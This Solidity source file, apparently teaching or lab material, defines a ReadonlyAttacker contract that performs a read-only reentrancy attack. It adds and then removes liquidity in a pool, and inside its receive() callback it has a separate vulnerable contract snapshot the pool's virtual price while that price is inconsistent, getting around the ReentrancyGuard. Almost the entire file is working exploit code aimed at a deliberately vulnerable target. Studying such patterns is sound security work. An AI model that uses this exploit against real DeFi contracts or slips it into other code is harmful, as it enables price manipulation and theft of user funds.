// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../ReadOnly.sol";

//Even with 'ReentrancyGuard' view functions can still be used, and turned in 'write' methods with a help of another contract.

contract ReadonlyAttacker {
    ReadOnlyPool public readOnlyPool;
    VulnerableDeFiContract public vulnerableDeFiContract;

    constructor(ReadOnlyPool readOnlyPool_, VulnerableDeFiContract vulnerableDeFiContract_) {
        readOnlyPool = readOnlyPool_;
        vulnerableDeFiContract = vulnerableDeFiContract_;
    }

    function attack() external payable {
        readOnlyPool.addLiquidity{value:msg.value}();
        readOnlyPool.removeLiquidity();
    }

    receive() external payable {
        vulnerableDeFiContract.snapshotPrice(); //use ReadOnlyPool.getVirtualPrice() view function, despite ReentrancyGuard
    }
}
